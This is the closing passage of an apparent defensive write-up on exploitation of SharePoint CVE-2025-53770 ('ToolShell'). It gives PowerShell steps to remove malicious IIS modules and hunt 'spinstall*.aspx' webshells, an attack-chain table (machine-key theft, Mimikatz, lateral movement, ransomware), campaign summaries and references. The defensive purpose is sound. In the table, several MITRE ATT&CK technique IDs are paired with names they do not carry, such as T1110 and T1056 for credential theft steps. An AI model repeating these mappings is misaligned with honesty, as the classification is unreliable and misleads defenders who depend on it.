    # Remove suspicious IIS modules
    Get-WebModule | Where-Object {$_.ModuleName -like "*Malicious*"} | Remove-WebModule
    
    # Rotate machine keys (see Priority 1 mitigations above)
    
    # Reset IIS
    iisreset /force
    
    # Restart SharePoint services
    Restart-Service W3SVC
    Restart-Service SPAdminV4
    
    # Apply patches (if not already done)
    ```

5.  **Verify Eradication:**
    
    **Command:**
    ```powershell
    # Verify no spinstall webshells remain
    Get-ChildItem -Path "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions" -Recurse -Filter "spinstall*.aspx"
    # Expected: No results
    
    # Verify machine keys rotated (newer than compromise date)
    $webConfig = "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\web.config"
    (Get-Item $webConfig).LastWriteTime
    
    # Expected: Date after patch application
    ```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [T1580] Cloud Service Enumeration | Attacker identifies internet-exposed SharePoint server via Shodan, Censys |
| **2** | **Initial Access** | **[PERSIST-REMOTE-001] SharePoint Exploitation** | **Attacker exploits CVE-2025-53770 for unauthenticated RCE** |
| **3** | **Credential Access** | [T1110] Credential Access via Machine Keys | Attacker steals machine keys for persistent ViewState forgery |
| **4** | **Persistence** | [T1547] Privilege Escalation via IIS Module | Attacker deploys custom IIS module for continued access |
| **5** | **Credential Access** | [T1056] Credential Dumping (Mimikatz) | Attacker harvests AD credentials for lateral movement |
| **6** | **Lateral Movement** | [T1570] Lateral Movement to Domain Controller | Attacker compromises DC using stolen credentials |
| **7** | **Impact** | [T1565] Data Destruction / Exfiltration | Attacker deploys ransomware or exfiltrates sensitive documents |

---

## 13. REAL-WORLD EXAMPLES

#### Example 1: ToolShell Campaign (July 2025 – Ongoing)

- **Target:** Government agencies, Universities, Energy companies (75+ organizations globally)
- **Timeline:** July 17 - Present (active)
- **Technique Status:** Attackers using CVE-2025-53770 (deserialization variant) for unauthenticated RCE; deploying spinstall0.aspx webshells; extracting machine keys
- **Attribution:** Threat actor cluster CL-CRI-1040 (linked to Storm-2603 by Microsoft)
- **Impact:** Full server compromise; exfiltration of MachineKeys enabling indefinite persistence; lateral movement to domain controllers; ransomware deployment suspected in follow-up attacks
- **Reference:** [Palo Alto Unit 42 - ToolShell Analysis](https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/)

#### Example 2: APT Group Targeting Financial Services (2025)

- **Target:** Multi-national financial institutions
- **Timeline:** April - July 2025 (pre-patch phase)
- **Technique Status:** Exploited CVE-2025-49704/49706 (required authentication); used insider threat to gain initial credentials; deployed ViewState webshells; stole trading algorithms from SharePoint document library
- **Impact:** Intellectual property theft; trading algorithm exfiltration; competitive advantage loss
- **Reference:** [Trellix – Critical SharePoint Vulnerabilities](https://www.trellix.com/blogs/research/critical-sharepoint-vulnerabilities-under-active-exploitation/)

---

## Appendix: References & Sources

1. [MITRE ATT&CK T1133 - External Remote Services](https://attack.mitre.org/techniques/T1133/)
2. [CVE-2025-53770 – NIST CVE Database](https://nvd.nist.gov/vuln/detail/CVE-2025-53770)
3. [CVE-2025-49704 – NIST CVE Database](https://nvd.nist.gov/vuln/detail/CVE-2025-49704)
4. [Palo Alto Unit 42 - Active Exploitation of SharePoint Vulnerabilities](https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/)
5. [Microsoft Security Response Center - SharePoint Vulnerability Updates](https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilitie/)
6. [Trellix - Critical SharePoint Vulnerabilities Under Active Exploitation](https://www.trellix.com/blogs/research/critical-sharepoint-vulnerabilities-under-active-exploitation/)
7. [Splunk - SharePoint Exploits and IIS Module Persistence](https://www.splunk.com/en_us/blog/security/sharepoint-exploits-and-the-hidden-threat-of-iis-module-persistence.html)
8. [The Hacker News - CVE-2025-53770 Mass Exploitation](https://thehackernews.com/2025/07/critical-microsoft-sharepoint-flaw.html)
9. [Cisco Talos - ToolShell: CVE Details](https://blog.talosintelligence.com/toolshell-affecting-sharepoint-servers/)
10. [Trend Micro - CVE-2025-53770 and CVE-2025-53771 Analysis](https://www.trendmicro.com/en_us/research/25/g/cve-2025-53770-and-cve-2025-53771-sharepoint-attacks.html)

---